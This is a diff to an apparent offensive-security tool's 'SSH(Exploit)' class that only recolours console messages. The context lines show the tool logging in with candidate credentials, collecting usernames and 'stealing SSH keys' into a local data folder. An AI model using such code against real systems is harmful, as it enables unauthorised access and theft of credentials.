@@ -19,7 +19,7 @@ class SSH(Exploit):
             loot = (toks[0], None)
             if loot not in usernames:
                 usernames.append(loot)
-        print(f"{Color.GRN}Success.{Color.END} Usernames found: ", file=self.output)
+        print(f"{Color.BGRN}Success.{Color.END} Usernames found: ", file=self.output)
         print(usernames, file=self.output)
         return usernames
     
@@ -33,7 +33,7 @@ class SSH(Exploit):
             keys = keys_bytes.decode(encoding='UTF-8')
             with open(f"./data/{ip_address}_{username}_sshkey.txt", "w") as text_file:
                 text_file.write(keys)
-            print(f"{Color.GRN}Success.{Color.END} SSH keys saved in Data folder.", file=self.output)
+            print(f"{Color.BGRN}Success.{Color.END} SSH keys saved in Data folder.", file=self.output)
         finally:
             stdin.close()
 
@@ -46,10 +46,10 @@ class SSH(Exploit):
             try:
                 ssh.connect(ip_address, username=c[0], password=c[1])
             except:
-                print(f'{Color.RED}Authentification failed.{Color.END}', file=self.output)
+                print(f'{Color.BRED}Authentification failed.{Color.END}', file=self.output)
                 ssh.close()
             else:
-                print(f'{Color.GRN}Success.{Color.END} Now gathering all usernames.', file=self.output)
+                print(f'{Color.BGRN}Success.{Color.END} Now gathering all usernames.', file=self.output)
                 usernames = self.get_usernames(ssh)
                 
                 print(f'Now stealing SSH keys.', file=self.output)
